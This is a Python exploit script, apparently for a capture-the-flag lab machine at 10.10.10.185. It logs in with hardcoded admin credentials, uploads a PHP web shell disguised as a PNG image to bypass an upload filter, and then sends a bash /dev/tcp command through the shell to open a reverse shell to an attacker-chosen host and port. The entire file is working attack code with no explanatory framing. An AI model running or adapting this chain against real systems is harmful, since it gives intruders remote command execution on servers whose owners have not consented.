import requests
import traceback
import argparse
from urllib.parse import urljoin

def login():
    url = "http://10.10.10.185:80/login.php"
    cookies = {"PHPSESSID": "n218v9oeclcmjec6nf5mdd2kh5"}
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://10.10.10.185", "Referer": "http://10.10.10.185/login.php"}
    data = {"username": "admin", "password": "Th3s3usW4sK1ng"}
    try:
        print("[*] Sending the login request...")
        requests.post(url, headers=headers, cookies=cookies, data=data, allow_redirects=False)
        print("[+] Logged-in as admin:Th3s3usW4sK1ng")
    except Exception as e:
        print("[-] Failed to send the login request: ", e)
        traceback.print_exc()

def UploadWebShell():
    url = "http://10.10.10.185:80/upload.php"
    cookies = {"PHPSESSID": "n218v9oeclcmjec6nf5mdd2kh5"}
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0", "Content-Type": "multipart/form-data; boundary=----geckoformboundarycb83796d494f594c1e07354f21560693", "Origin": "http://10.10.10.185", "Referer": "http://10.10.10.185/upload.php"}
    data = "------geckoformboundarycb83796d494f594c1e07354f21560693\r\nContent-Disposition: form-data; name=\"image\"; filename=\"kid.php.png\"\r\nContent-Type: image/png\r\n\r\n\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x02{\x00\x00\x01\xff\x08\x06\x00\x00\x00/\xfd\x1b\xc4\x00\x00\x00\x01sRGB\x00\xae\xce\x1c\xe9\x00\x00\x00\x04gAMA\x00\x00\xb1\x8f\x0b\xfca\x05\x00\x00\x00\tpHYs\x00\x00\x16%\x00\x00\x16%\x01IR$\xf0\x00\x00\xff\xa5IDATx^\xec\xfd\xd9\xb2$Ir\xa6\t\xaa\x87\xef{xl\xb9g\"\xb1\x14\x80*TW%j\xea\xaa\xa8g\xa8\x87\xa8\xe7bzh\xde`\xde\xb1\xe7n\xfa=\xd0ET( \x13\xa8\xdc3v\xdf\x97\xe3\x11\xc3\xdf\xff3\x8b\x88\xaa\xa9\xd9\xb1\xb3\xfa\x12\xfe\xeba\x15\x11\x16\x16\x16\x16\x16QU6U3=\x17\xfe?\xff\xef\xff\xdb\xb7\xd3\x80\x0b\x17.\xb0wa\x05\xae\xde^\xdf\xf1\xed~b\xc7\x80\xd5^h\x1b\xef\xbd\xf7\xdet\xfb\xf6\x9d\xe9\x83\x0f?\x98n\xdd\xbe\xadq\xbcx\xfe|:88P\xdd{\xef]\xcc\xf4\xbd\xe9\xc2{\xdd\xb0o\xbf\xf5\xf0I\x9f<~<\xfd\xf1O\x9a~\xfb\xdb\xdfN/^\xbc\x98n\xdc\xb81\xdd\xb8~}\xbaz\xf5\xeat\xf9\xf2\xe5\xe9\xe2\xa5Kj?C\xb6\xbf\x10\xc9\xb7\xdf~3}\xf3M\xb9\xf3\xdb\xac\xea)\x86V\xc5\xbf\x10\xbb\xce\xdb\x0e\xcf\x8b\xd3\x0b\x8c#\xd2\xa7\xcf\x9eM\x1f\xf4\xc9\xf4\x8b_\xfc\xfd\xf4\xd7\xf37\xd3\xcd\x9b\xb7\x82\xf7\\>\t\xefO\xdf\xbc|9]\xba|\x89V\xd3\xbf\xfe\xeb\xaf\xa7\xff\xfd\xff\xffN\xff\xbf\xff\xe3\xff\x98\x9e=1\xbd\x17c\t%\xd37!\xf9MH`\x01\xf9\xea\xc7 \x9f\xfdbk\xa4e\xe9(\xb5\x0bs}'\xc3V]\xf8Du\xdfN\xcc\x0e\xb9\x8b\x17\xdf\x8b9\xbb\xa2\xf4\xd9\xb3\xa7\xd3A\xf8B~\x96\xd3K\xde\xe3\x89\x19\x10\x1b\xc0\xc5{\xf8\xf7\"\xfeyy0}\x1bmo^\xbf6}\xef\x93O\xa6\x1f\xff\xe8G\xd3\x87\x1f~\xa85q)|x\xf1b\xac\xab\x0b^\x13\xdf\xc4\xfc\xbf\xc4\xe7\xc1\xbf}\xeb\xf6t\xfb\xce\xed\xe9\xda\xb5k\xea\xf3\xf9\x8b\xe7\xd3\xb3\xa7O\xc2\x96g\xe1\xffgZ_\xc8\xaa\xe3 l+\xfb\xd8\x0e\x83%\xc2>\xc9\xdbj\x80\n\x8f\x80c\xe2\xe2\xf4\xf4\xe9\xf3\xe9w\xbf\xfb\xc3\xf4\xdf\xff\xfb?O\xff\xe3\xd7\xbf <?php system($_REQUEST['shell']) ?>\r\n------geckoformboundarycb83796d494f594c1e07354f21560693\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\nUpload Image\r\n------geckoformboundarycb83796d494f594c1e07354f21560693--\r\n"
    try:
        print("[*] Uploading the webshell...")
        r = requests.post(url, headers=headers, cookies=cookies, data=data)
        if "The file kid.php.png has been uploaded." in r.text:
            print("[+] Webshell has been uploaded successfully")
            print("[+] Verify: http://10.10.10.185/images/uploads/kid.php.png?shell=id")
    except Exception as e:
        print("[-] Failed to upload the webshell: ", e)
        traceback.print_exc()

def TriggerReverseShell(lhost, lport):
    url = "http://10.10.10.185:80/images/uploads/kid.php.png"
    cookies = {"PHPSESSID": "n218v9oeclcmjec6nf5mdd2kh5"}
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0", "Content-Type": "application/x-www-form-urlencoded"}
    data = {"shell": f"bash -c \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\""}
    try:
        print("[+] Reverse shell triggered. Check your listener.")
        requests.post(url, headers=headers, cookies=cookies, data=data)
    except Exception as e:
        print("[-] Failed to trigger the reverse shell: ", e)
        traceback.print_exc()

def main():
    parser = argparse.ArgumentParser(description="Get a reverse shell")
    parser.add_argument("lhost", help="Attacker's machine IP")
    parser.add_argument("lport", help="listener port")
    args = parser.parse_args()

    login()
    UploadWebShell()
    TriggerReverseShell(args.lhost, args.lport)

if __name__ == "__main__":
    main()
